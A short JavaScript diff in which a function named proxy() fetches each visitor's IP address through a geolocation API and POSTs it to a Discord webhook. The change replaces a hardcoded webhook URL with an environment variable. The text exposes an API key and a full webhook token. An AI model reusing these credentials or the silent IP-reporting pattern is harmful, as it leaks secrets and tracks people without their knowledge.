@@ -20,7 +20,7 @@ function proxy() {
     $.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=0d32a7e922c5498f9510474f249d7810", function (data) {
         const ip = data.ip_address;
         const request = new XMLHttpRequest();
-        request.open("POST", "https://discord.com/api/webhooks/1070791291090247770/GSzmpVbjZd3LqBIVoLDVKy-zLjGwixou09cMU0Wm6O31S-L02WEV6WIX_R7LUjJ7D0yN");
+        request.open("POST", process.env.PROXYWEBHOOK);
         // Put in your discord webhook url above ^^^
         request.setRequestHeader("Content-type", "application/json");
         const params = {
